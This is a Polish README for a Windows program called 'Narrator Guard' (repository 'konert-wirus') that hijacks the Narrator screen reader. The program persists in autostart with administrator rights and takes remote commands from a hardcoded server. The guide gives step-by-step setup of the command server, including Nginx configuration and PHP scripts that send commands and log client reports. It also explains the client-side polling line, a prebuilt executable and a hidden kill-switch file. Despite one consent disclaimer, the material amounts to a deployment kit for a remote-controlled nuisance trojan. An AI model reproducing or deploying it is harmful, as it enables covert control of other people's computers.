# Narrator Guard - Instrukcja Instalacji i Konfiguracji

## Spis treści
1. [Opis projektu](#opis-projektu)
2. [Wymagania wstępne](#wymagania-wstepne)
3. [Instalacja na komputerze lokalnym](#instalacja-na-komputerze-lokalnym)
4. [Konfiguracja serwera VPS (Nginx)](#konfiguracja-serwera-vps-nginx)
5. [Użycie](#uzycie)
6. [Dodatkowe informacje](#dodatkowe-informacje)

---

## Opis projektu

`konert` to aplikacja napisana w języku Python, która ma za zadanie zarządzać uruchamianiem i zamykaniem programu Narrator w systemie Windows. Aplikacja umożliwia również zdalne sterowanie poprzez połączenie z serwerem VPS.

Projekt zawiera zarówno kod źródłowy, jak i skompilowaną wersję programu w formacie `.exe` w folderze `compiled`.

---

## Wymagania wstępne

### Lokalne
- System operacyjny: Windows (testowane na Windows 10/11)
- Python 3.9 lub nowszy (jeśli chcesz kompilować samodzielnie)
- Biblioteki Pythona wymienione w `requirements.txt`
- Prawa administracyjne na komputerze

### Serwer VPS
- Dostęp do serwera VPS z systemem Linux lub Windows
- Nginx lub inny serwer WWW
- PHP (do obsługi skryptów PHP)
- Port HTTP/HTTPS otwarty (domyślnie 80/443)

---

## Instalacja na komputerze lokalnym

### 1. Zainstaluj Python
Pobierz i zainstaluj najnowszą wersję Pythona z oficjalnej strony: [https://www.python.org/downloads/](https://www.python.org/downloads/).

### 2. Klonuj repozytorium
```bash
git clone https://github.com/KAJPER/konert-wirus.git
cd narrator-guard
```

### 3. Zainstaluj wymagane biblioteki
Uruchom poniższe polecenie, aby zainstalować wszystkie wymagane biblioteki:
```bash
pip install -r requirements.txt
```

### 4. Skompiluj program do formatu `.exe` (opcjonalne)
Jeśli chcesz utworzyć plik wykonywalny, użyj PyInstaller:
```bash
pyinstaller --onefile main.py
```
Skompilowany plik `.exe` znajdziesz w folderze `dist`. Możesz umieścić go w folderze `compiled` w głównym katalogu projektu.

### 5. Użyj gotowego pliku `.exe`
Jeśli nie chcesz kompilować programu samodzielnie, możesz użyć gotowego pliku `konert.exe` z folderu `compiled`.

---

## Konfiguracja serwera VPS (Nginx)

### 1. Przygotowanie serwera
#### a) Zainstaluj Nginx i PHP
Na przykład na Ubuntu:
```bash
sudo apt update
sudo apt install nginx php-fpm
```

#### b) Skonfiguruj Nginx
Edytuj plik konfiguracyjny Nginx (`/etc/nginx/sites-available/default`) i upewnij się, że jest on skonfigurowany do obsługi PHP. Przykładowa konfiguracja:

```nginx
server {
    listen 80;
    server_name your_vps_ip;

    root /var/www/html;
    index index.php index.html;

    location / {
        try_files $uri $uri/ =404;
    }

    location ~ \.php$ {
        include snippets/fastcgi-php.conf;
        fastcgi_pass unix:/var/run/php/php7.4-fpm.sock; # Sprawdź wersję PHP
        fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
        include fastcgi_params;
    }
}
```

Zastąp `your_vps_ip` adresem IP Twojego VPS.

#### c) Restartuj Nginx
```bash
sudo systemctl restart nginx
```

### 2. Wgraj pliki PHP
Przygotuj dwa pliki PHP:

#### `get_commands.php`
```php
<?php
header('Content-Type: application/json');
$command = ['command' => 'open_url', 'url' => 'https://example.com'];
echo json_encode($command);
?>
```

#### `confirm_command.php`
```php
<?php
file_put_contents('/var/www/html/commands_log.txt', print_r($_POST, true), FILE_APPEND);
http_response_code(200);
?>
```

Wgraj te pliki do folderu `/var/www/html` na serwerze.

### 3. Zmień adres IP w kodzie
Przed uruchomieniem programu, upewnij się, że w kodzie `main.py` zmieniono adres IP serwera VPS. Szukaj linii:
```python
response = requests.get('http://40.68.189.210/get_commands.php', timeout=5)
```
i zmień `40.68.189.210` na Twój adres IP VPS.

---

## Użycie

### 1. Uruchomienie aplikacji
Po zainstalowaniu wszystkich zależności, uruchom skrypt lub plik `.exe`:
- Jeśli używasz skryptu Pythona:
  ```bash
  python main.py
  ```
- Jeśli używasz pliku `.exe`:
  ```bash
  compiled\narrator_guard.exe
  ```

### 2. Obsługa kill switch
Aby wyłączyć aplikację i usunąć jej wpisy z autostartu:
1. Utwórz plik o nazwie `sperma.txt` w folderze `C:\Users\<TwojaNazwaUżytkownika>\Music\`.
2. Wpisz w pierwszej linii słowo `kindziuk`.
3. Zapisz plik.

Aplikacja wykryje ten plik i automatycznie się wyłączy.

### 3. Zdalne sterowanie
Edytuj plik `get_commands.php` na serwerze VPS, aby zmieniać komendy wysyłane do klienta. Aktualnie obsługiwana jest tylko komenda `open_url`, która otwiera podany adres URL.

---

## Dodatkowe informacje

### Logi
Aplikacja generuje logi w pliku `narrator_guard.log`, który znajdziesz w tym samym folderze co skrypt. Możesz użyć tych logów do debugowania problemów.

### Zabezpieczenia
- **Serwer VPS**: Upewnij się, że Twoja konfiguracja serwera jest bezpieczna. Używaj silnych haseł i ogranicz dostęp do niezbędnych portów.
- **Klient**: Program działa z uprawnieniami administratora. Upewnij się, że nie instalujesz go na komputerach bez zgody właściciela.

### Rozwój
Jeśli chcesz rozwinąć funkcjonalność programu, możesz dodać więcej komend zdalnych lub ulepszyć mechanizm logowania.

---

## Licencja

Ten projekt jest udostępniany na licencji MIT. Zobacz plik [LICENSE](LICENSE) dla szczegółów.

---
